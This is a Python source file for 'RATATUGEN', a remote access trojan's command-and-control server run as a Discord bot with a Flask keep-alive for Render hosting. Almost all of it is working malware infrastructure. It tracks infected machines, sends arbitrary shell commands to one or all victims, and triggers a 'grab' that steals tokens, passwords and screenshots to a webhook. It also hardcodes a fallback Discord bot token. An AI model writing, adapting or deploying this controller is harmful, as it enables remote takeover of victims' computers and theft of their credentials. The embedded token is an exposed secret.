"""
RATATUGEN Discord C2 Bot — Deploy on Render.com as Web Service
Runs 24/7: Discord bot + Flask health-check on different threads
"""
import discord, threading, os
from discord.ext import commands
from flask import Flask

TOKEN = os.environ.get("BOT_TOKEN", "MTUxNDY2MDU2NjE1MTU5ODM3Mg.GHDMYF.CbgDe1fkPp_5jkkPf63pkiYA-zqqvhSVbTU7gI")
ADMIN_ID = 1145707087666626670
CHANNEL_ID = 1514625087129780284

# Flask health-check — pings keep Render free tier alive
app = Flask(__name__)
@app.route('/')
def home():
    return "RATATUGEN C2 Online"

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

connected = {}  # client_id -> last_seen_time

@bot.event
async def on_ready():
    print(f"[C2] Online: {bot.user} | Channel: {CHANNEL_ID}")
    # Send startup notification
    ch = bot.get_channel(CHANNEL_ID)
    if ch:
        await ch.send("**RATATUGEN C2** is now online and listening for commands.")

@bot.event
async def on_message(msg):
    if msg.author.bot:
        return

    # Track RAT announcements: "[RAT-PCNAME] online" or similar
    if msg.channel.id == CHANNEL_ID and msg.content.startswith("[RAT-"):
        cid = msg.content.split()[0].strip("[] ")
        connected[cid] = discord.utils.utcnow()
        print(f"[C2] {cid} online")
        return

    # RAT command results are prefixed with [RAT-PCNAME]
    if msg.channel.id == CHANNEL_ID and msg.content.startswith("[RAT-") and "`" in msg.content:
        cid = msg.content.split("]")[0].strip("[")
        connected[cid] = discord.utils.utcnow()
        # Don't block — let it pass through

    await bot.process_commands(msg)

# ==================== COMMANDS ====================

@bot.command(name="sh")
async def shell(ctx, client_id: str, *, command: str):
    """!sh <RAT-PCNAME> <command> — Run shell command"""
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("Access denied", delete_after=5)
    ch = bot.get_channel(CHANNEL_ID)
    if not ch:
        return await ctx.send("Channel not found", delete_after=5)
    await ch.send(f"`CMD:{client_id}` ```\n{command}\n```")
    await ctx.send(f"✅ Sent `{command}` to `{client_id}`")

@bot.command(name="grab")
async def grab(ctx, client_id: str):
    """!grab <RAT-PCNAME> — Full data grab (tokens, passwords, screenshot)"""
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("Access denied", delete_after=5)
    ch = bot.get_channel(CHANNEL_ID)
    if not ch:
        return await ctx.send("Channel not found", delete_after=5)
    await ch.send(f"`CMD:{client_id}` ```\nGRAB_ALL\n```")
    await ctx.send(f"✅ Grab triggered on `{client_id}` — check webhook for data")

@bot.command(name="all")
async def all_cmd(ctx, *, command: str):
    """!all <command> — Broadcast to ALL agents"""
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("Access denied", delete_after=5)
    ch = bot.get_channel(CHANNEL_ID)
    if not ch:
        return await ctx.send("Channel not found", delete_after=5)
    await ch.send(f"`CMD:*` ```\n{command}\n```")
    await ctx.send(f"✅ Broadcast `{command}` to all agents")

@bot.command(name="allgrab")
async def allgrab(ctx):
    """!allgrab — Grab data from ALL agents"""
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("Access denied", delete_after=5)
    ch = bot.get_channel(CHANNEL_ID)
    if not ch:
        return await ctx.send("Channel not found", delete_after=5)
    await ch.send(f"`CMD:*` ```\nGRAB_ALL\n```")
    await ctx.send("✅ Broadcast grab to all agents")

@bot.command(name="uninstall")
async def uninstall(ctx, client_id: str):
    """!uninstall <RAT-PCNAME> — Remove RAT from target"""
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("Access denied", delete_after=5)
    ch = bot.get_channel(CHANNEL_ID)
    if not ch:
        return await ctx.send("Channel not found", delete_after=5)
    await ch.send(f"`CMD:{client_id}` ```\nUNINSTALL\n```")
    await ctx.send(f"✅ Uninstall command sent to `{client_id}`")

@bot.command(name="list")
async def list_cmd(ctx):
    """!list — Show connected agents"""
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("Access denied", delete_after=5)
    if not connected:
        return await ctx.send("No agents connected")
    import datetime
    lines = ["**Connected Agents:**"]
    for cid, last in sorted(connected.items()):
        d = (discord.utils.utcnow() - last).total_seconds()
        s = "🟢" if d < 60 else "🟡" if d < 300 else "🔴"
        lines.append(f"{s} `{cid}` — {int(d)}s ago")
    await ctx.send("\n".join(lines))

@bot.command(name="help")
async def help_cmd(ctx):
    """!help — Show commands"""
    await ctx.send("""**RATATUGEN C2 Commands**
```
!sh <agent> <cmd>     Run shell command
!grab <agent>         Full data exfiltration
!all <cmd>            Broadcast to all agents
!allgrab              Grab all agents
!uninstall <agent>    Remove RAT from target
!list                 List online agents
!help                 This menu
```
**Agent IDs** are `RAT-<COMPUTERNAME>` (e.g. `RAT-DESKTOP-ABC`).
Use `*` to target all (e.g. `!sh * whoami`).""")

if __name__ == "__main__":
    # Start Flask in background for Render health-check
    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000))),
        daemon=True
    ).start()
    # Run bot on main thread
    bot.run(TOKEN)